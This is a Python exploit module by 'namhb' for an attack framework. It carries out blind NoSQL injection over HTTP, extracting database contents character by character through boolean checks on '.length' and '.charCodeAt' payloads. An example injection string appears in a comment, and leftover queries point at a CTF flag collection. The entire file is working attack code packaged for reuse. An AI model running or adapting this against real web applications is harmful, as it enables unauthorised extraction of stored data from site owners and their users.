#!/usr/bin/python
#author: namhb
import sys, os, string
from libs.coreHTTPModule import coreHTTPModule
# Load core module
class module(coreHTTPModule):
	def __init__(self, logger, profile):
		coreHTTPModule.__init__(self, logger, profile)
		self.name							=	"Blind No SQL injection Module"
		self.description 					=	"Blind No SQL injection with brute force character ( greater than 100 requests/character)"
		self.rank							=	"HIGH"					# Exploit level
		self.type							=	"Exploit"				# Type: exploit | scanner | support
		self.author							=	"namhb"
		self.version						=	"0.0.1"
		self.maxLength 						=	255
		self.resultLength 					=	None
		self.result 						=	""
		self.basicOptions["PATTERN"] 		=	{
					"currentSetting"		:	None,
					"required"				:	True,
					"description"			:	"Pattern to check True/False"
					# For my exampe: view=namhb1'%26%26(*)%26%26'namhb1
		}
	def getNoSQLLength(self, query):
		for i in range(0, self.maxLength):
			# Payload: 1 and and length(version)=i
			payload 						=	" {0}.length=={1}".format(query, i)
			result 							=	self.checkQuery(payload)
			if(result == True):
				self.resultLength 			=	i
				break
	def getNoSQLCount(self, query):
		for i in range(0, self.maxLength):
			# Payload: 1 and and length(version)=i
			payload 						=	" {0}.count()=={1}".format(query, i)
			result 							=	self.checkQuery(payload)
			if(result == True):
				self.resultLength 			=	i
				break
	def runNoSQLQuery(self, query):
		self.logger.info("Run query: {0}".format(query))
		self.getNoSQLLength(query)
		if(self.resultLength == None):
			self.logger.info("Can`t not get query!")
			exit()
		self.logger.info("Result length: {0}".format(self.resultLength))
		self.getCharacter(query)
		self.logger.info("Result: {0}".format(self.result))
		# Clean result
		self.resultLength 					=	0
		self.result 						=	""

	def getCharacter(self, query):
		if(self.resultLength != None):
			for i in range(0, self.resultLength):
				for x in string.printable:
					asciiChar 				=	ord(x)
					payload 				=	" {0}.charCodeAt({1})=={2}".format(query, (i), asciiChar)
					result 					= 	self.checkQuery(payload)
					if(result == True):
						self.logger.info("Found character number {0} is: {1}".format(i, x))
						self.result 		+=	x
						self.logger.info("Result: {0}".format(self.result))
						break
	def checkQuery(self, payload):
		# Return true/false of query
		# If contain, return True, if not, return False
		# Or use regex
		r 									=	self.sendHTTPRequest(payload)
		if(r.text.find(self.basicOptions["PATTERN"]["currentSetting"]) > 0):
			return True
		else:
			return False
	
	def run(self):
		# print(self.getNoSQLLength("db.getCollectionNames()")) 4
		# self.getCharacter("db.getCollectionNames()[2]")
		# self.getCharacter("tojson(db.flag_ssctf.find()[0])")
		# print(self.getNoSQLCount("db.flag_ssct"))
		self.runNoSQLQuery("tojson(db.view_info.find()[0])")